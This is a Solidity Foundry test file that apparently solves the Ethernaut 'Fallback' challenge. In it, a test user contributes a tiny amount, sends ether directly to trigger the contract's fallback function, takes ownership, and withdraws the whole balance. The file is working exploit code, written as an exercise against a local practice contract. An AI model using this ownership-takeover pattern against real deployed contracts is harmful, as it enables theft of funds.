// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

// contribute() then send ether directly
contract FallbackTest is Test {
    Fallback public instance;

    function setUp() public {
        instance = new Fallback();
    }

    function test() public {
        assertEq(instance.owner(), address(this));

        address alice = makeAddr("alice");
        vm.deal(alice, 1 ether);
        vm.startPrank(alice);
        instance.contribute{value: 0.0001 ether}();
        address(instance).call{value: 0.0001 ether}("");
        assertEq(instance.owner(), alice);
        assertEq(alice.balance, 0.9998 ether);

        instance.withdraw();
        assertEq(alice.balance, 1 ether);
    }
}
